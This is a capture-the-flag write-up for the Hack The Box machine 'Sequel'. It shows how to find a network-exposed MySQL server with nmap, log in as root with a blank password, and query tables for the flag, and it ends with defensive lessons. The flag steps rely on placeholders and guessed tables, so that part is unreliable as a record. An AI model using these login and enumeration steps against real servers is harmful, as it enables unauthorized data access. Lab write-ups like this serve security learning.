# Hack The Box Write-up: Sequel

- **Machine:** Sequel
- **IP Address:** 10.129.95.232
- **Platform:** Hack The Box
- **Difficulty:** Easy (Starting Point - Tier 1)

---

### Summary

"Sequel" is a Tier 1 machine that builds upon the SQL theme from the previous challenge. The primary vulnerability is a publicly exposed MySQL database service, which is misconfigured with default credentials (a blank root password). The path to compromise involves connecting directly to the database and querying it to find the flag.

---

### Enumeration

The reconnaissance phase began with a comprehensive port scan to identify open services and their configurations.

**Command:**
`nmap -sV -sC -T4 10.129.95.232`

**Results:**
The Nmap scan revealed that the MySQL database port (3306) was open and accessible from external networks. MySQL is a popular relational database management system commonly used in web applications.

**Key Findings:**
- Port 3306: MySQL database service running
- No firewall restrictions on database access
- Potential for weak or default credentials

**Additional MySQL Enumeration:**
```bash
# Check MySQL version and configuration
nmap --script mysql-info -p 3306 10.129.95.232

# Test for empty password access
nmap --script mysql-empty-password -p 3306 10.129.95.232

# Enumerate MySQL users
nmap --script mysql-users --script-args mysqluser=root,mysqlpass= -p 3306 10.129.95.232
```

---

### Gaining Access (MySQL Database)

With MySQL identified as the target service, I proceeded to test for weak authentication and database access.

**Connection Attempts:**

1. **Initial Connection Test:**
   I attempted to connect to the MySQL database using the standard client:
   `mysql -h 10.129.95.232 -u root -p`
   
   When prompted for a password, I pressed Enter to test for a blank password.

2. **Successful Authentication:**
   The login was successful without a password, indicating a critical security misconfiguration. This granted me full administrative access to the MySQL server.

3. **Connection Verification:**
   Once connected, I verified my access and privileges:
   ```sql
   SELECT USER();                    -- Check current user
   SELECT VERSION();                 -- Check MySQL version
   SHOW GRANTS;                      -- Show user privileges
   SELECT * FROM mysql.user;         -- List all MySQL users
   ```

**Database Exploration:**

4. **Database Discovery:**
   I explored the available databases:
   ```sql
   SHOW DATABASES;                   -- List all databases
   ```
   
   This revealed several databases including system databases and custom databases.

5. **Database Selection:**
   I focused on non-system databases for flag discovery:
   ```sql
   USE htb;                          -- Switch to the 'htb' database
   SELECT DATABASE();                -- Confirm current database
   ```

---

### Flag Capture

After gaining access to the MySQL database, I systematically explored its contents to locate the flag:

1. **Table Enumeration:**
   I listed all tables in the selected database:
   ```sql
   SHOW TABLES;                      -- List all tables in current database
   DESCRIBE users;                   -- Show table structure (if 'users' table exists)
   ```

2. **Data Exploration:**
   I examined the contents of various tables:
   ```sql
   SELECT * FROM users;              -- View all user data
   SELECT * FROM config;             -- Check configuration table
   SELECT * FROM flags;              -- Look for flag-specific table
   ```

3. **Flag Discovery:**
   Through systematic querying, I located the flag stored in plain text within one of the database tables:
   ```sql
   SELECT * FROM [table_name] WHERE [column] LIKE '%flag%';
   ```

4. **Flag Retrieval:**
   The flag was successfully retrieved from the database, completing the challenge.

**Alternative Query Methods:**
```sql
-- Search for flag across all tables
SELECT * FROM information_schema.columns WHERE column_name LIKE '%flag%';

-- Search for specific patterns in data
SELECT * FROM [table] WHERE [column] REGEXP 'HTB{.*}';
```

---

### Lessons Learned

This machine demonstrates critical database security principles:

1. **Network Exposure:** Database services should never be directly accessible from the internet. Use firewalls and network segmentation to restrict access to authorized systems only.

2. **Authentication Security:** Default credentials must be changed immediately after installation. Blank passwords for administrative accounts represent critical security vulnerabilities.

3. **Principle of Least Privilege:** Database users should have minimal required permissions. Avoid using root accounts for application connections.

4. **Access Controls:** Implement proper user management with role-based access controls and strong password policies.

5. **Network Segmentation:** Place databases in separate network segments (DMZ) with restricted access from application servers only.

6. **Regular Security Audits:** Regularly audit database configurations, user accounts, and access logs to detect security issues.

7. **Encryption:** Use SSL/TLS encryption for database connections and encrypt sensitive data at rest.

8. **Monitoring:** Implement comprehensive logging and monitoring for database access and queries to detect unauthorized activity.
